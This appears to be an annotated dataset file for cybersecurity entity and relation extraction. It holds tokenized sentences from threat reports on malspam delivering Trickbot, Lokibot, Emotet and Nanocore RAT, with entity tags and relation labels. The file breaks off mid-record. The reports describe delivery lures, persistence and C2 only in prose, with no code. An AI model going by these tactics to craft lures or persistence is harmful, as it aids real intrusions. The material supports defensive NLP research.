[{"title": "639-0", "sents": [["The", "goal", "of", "malicious", "activity", "is", "to", "compromise", "the", "system", "to", "install", "some", "unauthorized", "software", "."], ["Once", "a", "user", "opens", "the", "attached", "spreadsheet", ",", "they", "are", "presented", "with", "a", "blurry", "image", "we", "commonly", "see", "associated", "with", "macro-based", "malspam", "."], ["In", "the", "background", "Trickbot", "is", "being", "downloaded", "and", "executed", "on", "the", "system", ",", "compromising", "it", "."], ["First", "would", "be", "searching", "the", "subject", "lines", "looking", "for", "keywords", "."], ["Additionally", ",", "you", "can", "search", "the", "bodies", "of", "emails", "for", "the", "same", "keywords", "to", "widen", "the", "search", "."], ["Finally", ",", "searching", "for", "attachment", "names", "for", "the", "target", "keywords", "is", "paramount", "."], ["The", "example", "shown", "above", "has", "a", ".cab", "file", "attached", "that", "contains", "a", "single", "executable", "(", "TAX", "Invoice.exe", ")", "."], ["When", "executed", "on", "the", "system", ",", "the", "file", "leverages", "GuLoader", "to", "drop", "Lokibot", ",", "infecting", "the", "end", "system", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "activity", "pos": [4, 5], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [9, 9], "name": "system", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [14, 14], "name": "software", "pos": [14, 15], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [18, 18], "name": "user", "pos": [2, 3], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [22, 22], "name": "spreadsheet", "pos": [6, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "blurry image", "pos": [13, 15], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "macro-based malspam", "pos": [20, 22], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [42, 42], "name": "Trickbot", "pos": [3, 4], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [53, 53], "name": "it", "pos": [14, 15], "index": "8_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [60, 60], "name": "subject lines", "pos": [5, 7], "index": "9_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [64, 64], "name": "keywords", "pos": [9, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [74, 74], "name": "emails", "pos": [8, 9], "index": "11_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [78, 78], "name": "keywords", "pos": [12, 13], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [88, 88], "name": "attachment", "pos": [4, 5], "index": "13_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [93, 93], "name": "keywords", "pos": [9, 10], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [103, 103], "name": ".cab file", "pos": [6, 8], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [110, 110], "name": "executable", "pos": [13, 14], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [123, 123], "name": "file", "pos": [7, 8], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [125, 125], "name": "GuLoader", "pos": [9, 10], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [128, 128], "name": "Lokibot", "pos": [12, 13], "index": "19_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [133, 133], "name": "system", "pos": [17, 18], "index": "20_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [1], "h": 3, "t": 5}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 7}, {"r": "EX", "evidence": [1, 2], "h": 3, "t": 7}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 3, "t": 11}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "h": 3, "t": 13}, {"r": "FR", "evidence": [1, 2, 3, 4, 5, 6], "h": 3, "t": 15}, {"r": "CO", "evidence": [1], "h": 5, "t": 6}, {"r": "CO", "evidence": [2], "h": 7, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "CO", "evidence": [3, 4, 5], "h": 10, "t": 14}, {"r": "WR", "evidence": [4, 5, 6], "t": 11, "h": 15}, {"r": "WR", "evidence": [5, 6], "t": 13, "h": 15}, {"r": "WR", "evidence": [6], "h": 15, "t": 16}, {"r": "EX", "evidence": [6, 7], "t": 16, "h": 17}, {"r": "FR", "evidence": [7], "h": 17, "t": 18}, {"r": "WR", "evidence": [5, 6, 7], "t": 14, "h": 18}, {"r": "WR", "evidence": [7], "h": 18, "t": 19}, {"r": "ST", "evidence": [7], "h": 17, "t": 20}, {"r": "RF", "evidence": [7], "h": 17, "t": 20}]}, {"title": "646-0", "sents": [["As", "usual", "with", "these", "sort", "of", "attachments", ",", "users", "are", "prompted", "to", "Enable", "Editing", "and", "Enable", "Content", ",", "granting", "the", "attacker", "the", "ability", "to", "execute", "code", "on", "the", "endpoint", "to", "facilitate", "the", "delivery", "and", "execution", "of", "Emotet", ",", "thus", "infecting", "the", "system", "."], ["As", "you", "can", "see", ",", "the", "email", "came", "with", "a", "ZIP", "file", "attached", ",", "which", "contained", "a", "PIF", "executable", "."], ["Once", "the", "victim", "executed", "the", "file", ",", "Nanocore", "RAT", "was", "installed", "on", "the", "system", ",", "giving", "the", "adversaries", "remote", "access", "."], ["This", "particular", "email", "was", "notifying", "customers", "of", "a", "delay", "in", "shipping", "due", "to", "coronavirus", "and", "attached", "a", ".pdf.ace", "invoice", "file", "."], ["Inside", "the", "compressed", "archive", "was", "an", "executable", "purporting", "to", "be", "a", "signed", "order", "confirmation", "."], ["Upon", "execution", ",", "additional", "data", "was", "attempted", "to", "be", "retrieved", "but", "due", "to", "the", "server", "being", "down", ",", "it", "is", "not", "possible", "to", "identify", "the", "final", "payload", "as", "of", "the", "time", "of", "publishing", "."], ["Upon", "execution", ",", "the", "RAT", "is", "installed", "and", "persistence", "is", "achieved", "by", "creating", "links", "in", "the", "user", "'s", "startup", "folder", ",", "as", "well", "as", "the", "creation", "of", "several", "scheduled", "tasks", ",", "and", "establishing", "command", "and", "control", "communications", "with", "a", "dynamic", "DNS", "provider", "domain", ",", "which", "is", "fairly", "common", "with", "RAT", "distribution", "."], ["It", "has", "the", "same", "basic", "functionality", "and", "allows", "the", "attacker", "the", "ability", "to", "upload", "and", "download", "files", "as", "well", "as", "grab", "things", "like", "keystrokes", "and", "screen", "captures", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "attachments", "pos": [6, 7], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [8, 8], "name": "users", "pos": [8, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [20, 20], "name": "attacker", "pos": [20, 21], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [25, 25], "name": "code", "pos": [25, 26], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [36, 36], "name": "Emotet", "pos": [36, 37], "index": "4_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [41, 41], "name": "system", "pos": [41, 42], "index": "5_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [49, 49], "name": "email", "pos": [6, 7], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [53, 53], "name": "ZIP file", "pos": [10, 12], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [60, 60], "name": "PIF executable", "pos": [17, 19], "index": "8_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [65, 65], "name": "victim", "pos": [2, 3], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [68, 68], "name": "file", "pos": [5, 6], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [70, 70], "name": "Nanocore RAT", "pos": [7, 9], "index": "11_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [76, 76], "name": "system", "pos": [13, 14], "index": "12_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [80, 80], "name": "adversaries", "pos": [17, 18], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [86, 86], "name": "email", "pos": [2, 3], "index": "14_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [89, 89], "name": "customers", "pos": [5, 6], "index": "15_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [101, 101], "name": ".pdf.ace invoice file", "pos": [17, 20], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [107, 107], "name": "compressed archive", "pos": [2, 4], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [111, 111], "name": "executable", "pos": [6, 7], "index": "18_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [124, 124], "name": "data", "pos": [4, 5], "index": "19_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [134, 134], "name": "server", "pos": [14, 15], "index": "20_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [138, 138], "name": "it", "pos": [18, 19], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [146, 146], "name": "payload", "pos": [26, 27], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [158, 158], "name": "RAT", "pos": [4, 5], "index": "23_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [167, 167], "name": "links", "pos": [13, 14], "index": "24_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [182, 182], "name": "scheduled tasks", "pos": [28, 30], "index": "25_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [193, 193], "name": "dynamic DNS provider domain", "pos": [39, 43], "index": "26_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [206, 206], "name": "It", "pos": [0, 1], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [215, 215], "name": "attacker", "pos": [9, 10], "index": "28_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [222, 222], "name": "files", "pos": [16, 17], "index": "29_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [229, 229], "name": "keystrokes and screen captures", "pos": [23, 27], "index": "30_0"}]], "labels": [{"r": "RD", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [0], "h": 1, "t": 4}, {"r": "EX", "evidence": [0], "t": 3, "h": 4}, {"r": "RD", "evidence": [0], "h": 2, "t": 5}, {"r": "RD", "evidence": [0], "h": 2, "t": 5}, {"r": "WR", "evidence": [0], "h": 2, "t": 5}, {"r": "RD", "evidence": [0], "h": 4, "t": 5}, {"r": "RD", "evidence": [0], "h": 4, "t": 5}, {"r": "WR", "evidence": [0], "h": 4, "t": 5}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 9}, {"r": "CO", "evidence": [1], "h": 7, "t": 8}, {"r": "CO", "evidence": [1, 2], "h": 7, "t": 10}, {"r": "EX", "evidence": [2], "h": 9, "t": 10}, {"r": "FR", "evidence": [2], "h": 9, "t": 11}, {"r": "RD", "evidence": [2], "t": 12, "h": 13}, {"r": "RD", "evidence": [2], "t": 12, "h": 13}, {"r": "WR", "evidence": [2], "t": 12, "h": 13}, {"r": "FR", "evidence": [2, 3], "h": 13, "t": 15}, {"r": "WR", "evidence": [3, 4], "h": 15, "t": 17}, {"r": "ST", "evidence": [3, 4, 5], "h": 15, "t": 20}, {"r": "RF", "evidence": [3, 4, 5], "h": 15, "t": 20}, {"r": "CO", "evidence": [3], "h": 14, "t": 16}, {"r": "CO", "evidence": [4], "h": 17, "t": 18}, {"r": "EX", "evidence": [4, 5], "t": 18, "h": 21}, {"r": "RD", "evidence": [5], "t": 19, "h": 21}, {"r": "ST", "evidence": [5], "t": 20, "h": 21}, {"r": "RF", "evidence": [5], "t": 20, "h": 21}, {"r": "WR", "evidence": [5], "h": 21, "t": 22}, {"r": "WR", "evidence": [5, 6], "t": 22, "h": 23}, {"r": "WR", "evidence": [6], "h": 23, "t": 24}, {"r": "WR", "evidence": [6], "h": 23, "t": 25}, {"r": "ST", "evidence": [6], "h": 23, "t": 26}, {"r": "RF", "evidence": [6], "h": 23, "t": 26}, {"r": "WR", "evidence": [6, 7], "h": 23, "t": 27}, {"r": "WR", "evidence": [7], "t": 27, "h": 28}, {"r": "WR", "evidence": [7], "t": 27, "h": 28}, {"r": "RD", "evidence": [7], "h": 28, "t": 29}, {"r": "RD", "evidence": [7], "h": 28, "t": 29}, {"r": "WR", "evidence": [7], "h": 28, "t": 29}, {"r": "RD", "evidence": [7], "h": 28, "t": 29}, {"r": "RD", "evidence": [7], "h": 28, "t": 29}, {"r": "WR", "evidence": [7], "h": 28, "t": 29}, {"r": "RD", "evidence": [7], "h": 28, "t": 30}, {"r": "RD", "evidence": [7], "h": 28, "t": 30}, {"r": "WR", "evidence": [7], "h": 28, "t": 30}]}, {"title": "646-1", "sents": [["As", "you", "can", "see", ",", "the", "email", "came", "with", "a", "ZIP", "file", "attached", ",", "which", "contained", "a", "PIF", "executable", "."], ["Once", "the", "victim", "executed", "the", "file", ",", "Nanocore", "RAT", "was", "installed", "on", "the", "system", ",", "giving", "the", "adversaries", "remote", "access", "."], ["This", "particular", "email", "was", "notifying", "customers", "of", "a", "delay", "in", "shipping", "due", "to", "coronavirus", "and", "attached", "a", ".pdf.ace", "invoice", "file", "."], ["Inside", "the", "compressed", "archive", "was", "an", "executable", "purporting", "to", "be", "a", "signed", "order", "confirmation", "."], ["Upon", "execution", ",", "additional", "data", "was", "attempted", "to", "be", "retrieved", "but", "due", "to", "the", "server", "being", "down", ",", "it", "is", "not", "possible", "to", "identify", "the", "final", "payload", "as", "of", "the", "time", "of", "publishing", "."], ["Upon", "execution", ",", "the", "RAT", "is", "installed", "and", "persistence", "is", "achieved", "by", "creating", "links", "in", "the", "user", "'s", "startup", "folder", ",", "as", "well", "as", "the", "creation", "of", "several", "scheduled", "tasks", ",", "and", "establishing", "command", "and", "control", "communications", "with", "a", "dynamic", "DNS", "provider", "domain", ",", "which", "is", "fairly", "common", "with", "RAT", "distribution", "."], ["It", "has", "the", "same", "basic", "functionality", "and", "allows", "the", "attacker", "the", "ability", "to", "upload", "and", "download", "files", "as", "well", "as", "grab", "things", "like", "keystrokes", "and", "screen", "captures", "."], ["This", "file", "was", "found", "with", "the", "suspicious", "filename", "of", "``", "CoronaVirus.exe", "''", "of", "which", "there", "were", "many", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [6, 6], "name": "email", "pos": [6, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "ZIP file", "pos": [10, 12], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "PIF executable", "pos": [17, 19], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [22, 22], "name": "victim", "pos": [2, 3], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "file", "pos": [5, 6], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "Nanocore RAT", "pos": [7, 9], "index": "5_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [33, 33], "name": "system", "pos": [13, 14], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [37, 37], "name": "adversaries", "pos": [17, 18], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [43, 43], "name": "email", "pos": [2, 3], "index": "8_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [46, 46], "name": "customers", "pos": [5, 6], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [58, 58], "name": ".pdf.ace invoice file", "pos": [17, 20], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [64, 64], "name": "compressed archive", "pos": [2, 4], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [68, 68], "name": "executable", "pos": [6, 7], "index": "12_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [81, 81], "name": "data", "pos": [4, 5], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [91, 91], "name": "server", "pos": [14, 15], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [95, 95], "name": "it", "pos": [18, 19], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [103, 103], "name": "payload", "pos": [26, 27], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [115, 115], "name": "RAT", "pos": [4, 5], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [124, 124], "name": "links", "pos": [13, 14], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [139, 139], "name": "scheduled tasks", "pos": [28, 30], "index": "19_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [150, 150], "name": "dynamic DNS provider domain", "pos": [39, 43], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [163, 163], "name": "It", "pos": [0, 1], "index": "21_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [172, 172], "name": "attacker", "pos": [9, 10], "index": "22_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [179, 179], "name": "files", "pos": [16, 17], "index": "23_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [186, 186], "name": "keystrokes and screen captures", "pos": [23, 27], "index": "24_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [192, 192], "name": "file", "pos": [1, 2], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [201, 201], "name": "CoronaVirus.exe", "pos": [10, 11], "index": "26_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "EX", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [1], "h": 3, "t": 5}, {"r": "RD", "evidence": [1], "t": 6, "h": 7}, {"r": "RD", "evidence": [1], "t": 6, "h": 7}, {"r": "WR", "evidence": [1], "t": 6, "h": 7}, {"r": "FR", "evidence": [1, 2], "h": 7, "t": 9}, {"r": "WR", "evidence": [2, 3], "h": 9, "t": 11}, {"r": "ST", "evidence": [2, 3, 4], "h": 9, "t": 14}, {"r": "RF", "evidence": [2, 3, 4], "h": 9, "t": 14}, {"r": "CO", "evidence": [2], "h": 8, "t": 10}, {"r": "CO", "evidence": [3], "h": 11, "t": 12}, {"r": "EX", "evidence": [3, 4], "t": 12, "h": 15}, {"r": "RD", "evidence": [4], "t": 13, "h": 15}, {"r": "ST", "evidence": [4], "t": 14, "h": 15}, {"r": "RF", "evidence": [4], "t": 14, "h": 15}, {"r": "WR", "evidence": [4], "h": 15, "t": 16}, {"r": "WR", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "WR", "evidence": [5], "h": 17, "t": 18}, {"r": "WR", "evidence": [5], "h": 17, "t": 19}, {"r": "ST", "evidence": [5], "h": 17, "t": 20}, {"r": "RF", "evidence": [5], "h": 17, "t": 20}, {"r": "WR", "evidence": [5, 6], "h": 17, "t": 21}, {"r": "WR", "evidence": [6], "t": 21, "h": 22}, {"r": "WR", "evidence": [6], "t": 21, "h": 22}, {"r": "RD", "evidence": [6], "h": 22, "t": 23}, {"r": "RD", "evidence": [6], "h": 22, "t": 23}, {"r": "WR", "evidence": [6], "h": 22, "t": 23}, {"r": "RD", "evidence": [6], "h": 22, "t": 23}, {"r": "RD", "evidence": [6], "h": 22, "t": 23}, {"r": "WR", "evidence": [6], "h": 22, "t": 23}, {"r": "RD", "evidence": [6], "h": 22, "t": 24}, {"r": "RD", "evidence": [6], "h": 22, "t": 24}, {"r": "WR", "evidence": [6], "h": 22, "t": 24}, {"r": "CO", "evidence": [7], "h": 25, "t": 26}]}, {"title": "646-2", "sents": [["Once", "the", "victim", "executed", "the", "file", ",", "Nanocore", "RAT", "was", "installed", "on", "the", "system", ",", "giving", "the", "adversaries", "remote", "access", "."], ["This", "particular", "email", "was", "notifying", "customers", "of", "a", "delay", "in", "shipping", "due", "to", "coronavirus", "and", "attached", "a", ".pdf.ace", "invoice", "file", "."], ["Inside", "the", "compressed", "archive", "was", "an", "executable", "purporting", "to", "be", "a", "signed", "order", "confirmation", "."], ["Upon", "execution", ",", "additional", "data", "was", "attempted", "to", "be", "retrieved", "but", "due", "to", "the", "server", "being", "down", ",", "it", "is", "not", "possible", "to", "identify", "the", "final", "payload", "as", "of", "the", "time", "of", "publishing", "."], ["Upon", "execution", ",", "the", "RAT", "is", "installed", "and", "persistence", "is", "achieved", "by", "creating", "links", "in", "the", "user", "'s", "startup", "folder", ",", "as", "well", "as", "the", "creation", "of", "several", "scheduled", "tasks", ",", "and", "establishing", "command", "and", "control", "communications", "with", "a", "dynamic", "DNS", "provider", "domain", ",", "which", "is", "fairly", "common", "with", "RAT", "distribution", "."], ["It", "has", "the", "same", "basic", "functionality", "and", "allows", "the", "attacker", "the", "ability", "to", "upload", "and", "download", "files", "as", "well", "as", "grab", "things", "like", "keystrokes", "and", "screen", "captures", "."], ["This", "file", "was", "found", "with", "the", "suspicious", "filename", "of", "``", "CoronaVirus.exe", "''", "of", "which", "there", "were", "many", "."], ["The", "rough", "translation", "of", "the", "text", "displayed", "to", "the", "user", "is", "``", "Deleting", "all", "files", "and", "folders", "on", "this", "computer", "-", "Coronavirus.", "``"]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [2, 2], "name": "victim", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "file", "pos": [5, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "Nanocore RAT", "pos": [7, 9], "index": "2_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [13, 13], "name": "system", "pos": [13, 14], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [17, 17], "name": "adversaries", "pos": [17, 18], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "email", "pos": [2, 3], "index": "5_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [26, 26], "name": "customers", "pos": [5, 6], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [38, 38], "name": ".pdf.ace invoice file", "pos": [17, 20], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [44, 44], "name": "compressed archive", "pos": [2, 4], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "executable", "pos": [6, 7], "index": "9_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [61, 61], "name": "data", "pos": [4, 5], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [71, 71], "name": "server", "pos": [14, 15], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [75, 75], "name": "it", "pos": [18, 19], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [83, 83], "name": "payload", "pos": [26, 27], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [95, 95], "name": "RAT", "pos": [4, 5], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [104, 104], "name": "links", "pos": [13, 14], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [119, 119], "name": "scheduled tasks", "pos": [28, 30], "index": "16_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [130, 130], "name": "dynamic DNS provider domain", "pos": [39, 43], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [143, 143], "name": "It", "pos": [0, 1], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [152, 152], "name": "attacker", "pos": [9, 10], "index": "19_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [159, 159], "name": "files", "pos": [16, 17], "index": "20_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [166, 166], "name": "keystrokes and screen captures", "pos": [23, 27], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [172, 172], "name": "file", "pos": [1, 2], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [181, 181], "name": "CoronaVirus.exe", "pos": [10, 11], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [194, 194], "name": "text", "pos": [5, 6], "index": "24_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [198, 198], "name": "user", "pos": [9, 10], "index": "25_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "t": 3, "h": 4}, {"r": "RD", "evidence": [0], "t": 3, "h": 4}, {"r": "WR", "evidence": [0], "t": 3, "h": 4}, {"r": "FR", "evidence": [0, 1], "h": 4, "t": 6}, {"r": "WR", "evidence": [1, 2], "h": 6, "t": 8}, {"r": "ST", "evidence": [1, 2, 3], "h": 6, "t": 11}, {"r": "RF", "evidence": [1, 2, 3], "h": 6, "t": 11}, {"r": "CO", "evidence": [1], "h": 5, "t": 7}, {"r": "CO", "evidence": [2], "h": 8, "t": 9}, {"r": "EX", "evidence": [2, 3], "t": 9, "h": 12}, {"r": "RD", "evidence": [3], "t": 10, "h": 12}, {"r": "ST", "evidence": [3], "t": 11, "h": 12}, {"r": "RF", "evidence": [3], "t": 11, "h": 12}, {"r": "WR", "evidence": [3], "h": 12, "t": 13}, {"r": "WR", "evidence": [3, 4], "t": 13, "h": 14}, {"r": "WR", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [4], "h": 14, "t": 16}, {"r": "ST", "evidence": [4], "h": 14, "t": 17}, {"r": "RF", "evidence": [4], "h": 14, "t": 17}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 18}, {"r": "WR", "evidence": [5], "t": 18, "h": 19}, {"r": "WR", "evidence": [5], "t": 18, "h": 19}, {"r": "RD", "evidence": [5], "h": 19, "t": 20}, {"r": "RD", "evidence": [5], "h": 19, "t": 20}, {"r": "WR", "evidence": [5], "h": 19, "t": 20}, {"r": "RD", "evidence": [5], "h": 19, "t": 20}, {"r": "RD", "evidence": [5], "h": 19, "t": 20}, {"r": "WR", "evidence": [5], "h": 19, "t": 20}, {"r": "RD", "evidence": [5], "h": 19, "t": 21}, {"r": "RD", "evidence": [5], "h": 19, "t": 21}, {"r": "WR", "evidence": [5], "h": 19, "t": 21}, {"r": "WR", "evidence": [5, 6, 7], "h": 19, "t": 24}, {"r": "CO", "evidence": [6], "h": 22, "t": 23}, {"r": "RD", "evidence": [5, 6, 7], "t": 20, "h": 24}, {"r": "WR", "evidence": [5, 6, 7], "t": 20, "h": 24}, {"r": "RD", "evidence": [5, 6, 7], "t": 21, "h": 24}, {"r": "WR", "evidence": [5, 6, 7], "t": 21, "h": 24}, {"r": "WR", "evidence": [7], "t": 24, "h": 25}, {"r": "WR", "evidence": [7], "t": 24, "h": 25}]}, {"title": "646-3", "sents": [["This", "particular", "email", "was", "notifying", "customers", "of", "a", "delay", "in", "shipping", "due", "to", "coronavirus", "and", "attached", "a", ".pdf.ace", "invoice", "file", "."], ["Inside", "the", "compressed", "archive", "was", "an", "executable", "purporting", "to", "be", "a", "signed", "order", "confirmation", "."], ["Upon", "execution", ",", "additional", "data", "was", "attempted", "to", "be", "retrieved", "but", "due", "to", "the", "server", "being", "down", ",", "it", "is", "not", "possible", "to", "identify", "the", "final", "payload", "as", "of", "the", "time", "of", "publishing", "."], ["Upon", "execution", ",", "the", "RAT", "is", "installed", "and", "persistence", "is", "achieved", "by", "creating", "links", "in", "the", "user", "'s", "startup", "folder", ",", "as", "well", "as", "the", "creation", "of", "several", "scheduled", "tasks", ",", "and", "establishing", "command", "and", "control", "communications", "with", "a", "dynamic", "DNS", "provider", "domain", ",", "which", "is", "fairly", "common", "with", "RAT", "distribution", "."], ["It", "has", "the", "same", "basic", "functionality", "and", "allows", "the", "attacker", "the", "ability", "to", "upload", "and", "download", "files", "as", "well", "as", "grab", "things", "like", "keystrokes", "and", "screen", "captures", "."], ["This", "file", "was", "found", "with", "the", "suspicious", "filename", "of", "``", "CoronaVirus.exe", "''", "of", "which", "there", "were", "many", "."], ["The", "rough", "translation", "of", "the", "text", "displayed", "to", "the", "user", "is", "``", "Deleting", "all", "files", "and", "folders", "on", "this", "computer", "-", "Coronavirus.", "``"], ["Upon", "completion", "of", "the", "counter", ",", "the", "button", "at", "the", "bottom", "became", "clickable", ",", "and", "when", "clicked", ",", "displayed", "the", "following", "message", ":", "This", "says", "it", "is", "a", "joke", "and", "the", "user", "can", "press", "Alt", "+", "F12", "to", "exit", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "email", "pos": [2, 3], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [5, 5], "name": "customers", "pos": [5, 6], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": ".pdf.ace invoice file", "pos": [17, 20], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [23, 23], "name": "compressed archive", "pos": [2, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [27, 27], "name": "executable", "pos": [6, 7], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [40, 40], "name": "data", "pos": [4, 5], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [50, 50], "name": "server", "pos": [14, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [54, 54], "name": "it", "pos": [18, 19], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [62, 62], "name": "payload", "pos": [26, 27], "index": "8_0"}], [{"type": 